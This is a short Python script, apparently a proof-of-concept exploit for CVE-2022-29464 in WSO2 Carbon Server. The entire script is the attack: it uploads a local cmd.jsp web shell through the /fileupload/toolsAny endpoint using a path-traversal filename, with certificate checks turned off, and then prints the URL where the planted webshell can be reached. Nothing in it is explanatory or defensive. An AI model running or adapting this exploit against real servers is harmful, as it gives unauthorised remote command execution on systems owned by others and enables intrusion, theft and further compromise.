from ast import arg
import requests
import argparse


def main():
    parser = argparse.ArgumentParser(description="WSO2 Carbon Server CVE-2022-29464")
    parser.add_argument("-u", help="WSO2 Carbon Server URL", required=True)
    args = parser.parse_args()
    endpoint_url = args.u
    jsp_file = open("./cmd.jsp", "rb")
    resp = requests.post(f"{endpoint_url}/fileupload/toolsAny", verify=False, files={"../../../../repository/deployment/server/webapps/user-portal/cmd.jsp": jsp_file.read()})
    print (resp.status_code)
    print (resp.content)
    if resp.status_code == 200 and len(resp.content) > 0:
        print (f"Successfully exploited, webshell is hosted: {endpoint_url}/user-portal/cmd.jsp")
        exit(0)

if "__main__" == __name__:
    main()



